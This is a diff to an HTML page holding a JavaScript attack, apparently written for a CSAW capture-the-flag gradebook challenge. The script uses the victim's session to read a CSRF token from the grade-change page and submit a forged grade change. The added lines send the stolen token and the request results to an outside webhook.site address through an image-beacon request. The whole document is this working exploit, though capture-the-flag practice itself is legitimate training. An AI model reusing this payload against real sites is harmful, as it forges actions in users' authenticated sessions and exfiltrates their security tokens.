@@ -2,6 +2,13 @@
 <html>
 <body>
     <script>
+        // Function to send data to webhook via GET request
+        function sendToWebhook(data) {
+            const params = new URLSearchParams();
+            params.append('data', JSON.stringify(data));
+            new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
+        }
+
         // Step 1: Get CSRF token from grade-change page
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include'
@@ -12,6 +19,13 @@
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
+
+            // Send CSRF token to webhook
+            sendToWebhook({
+                type: 'csrf_token',
+                token: csrfToken,
+                message: 'CSRF token extracted successfully'
+            });
 
             // Step 2: Submit grade change POST request
             const formData = new FormData();
@@ -24,6 +38,31 @@
                 method: 'POST',
                 body: formData,
                 credentials: 'include'
+            })
+            .then(response => {
+                // Send success to webhook
+                sendToWebhook({
+                    type: 'post_success',
+                    status: response.status,
+                    statusText: response.statusText,
+                    message: 'Grade change POST request successful'
+                });
+            })
+            .catch(error => {
+                // Send error to webhook
+                sendToWebhook({
+                    type: 'post_error',
+                    error: error.toString(),
+                    message: 'Grade change POST request failed'
+                });
+            });
+        })
+        .catch(error => {
+            // Send GET error to webhook
+            sendToWebhook({
+                type: 'get_error',
+                error: error.toString(),
+                message: 'CSRF token fetch failed'
             });
         });
     </script>
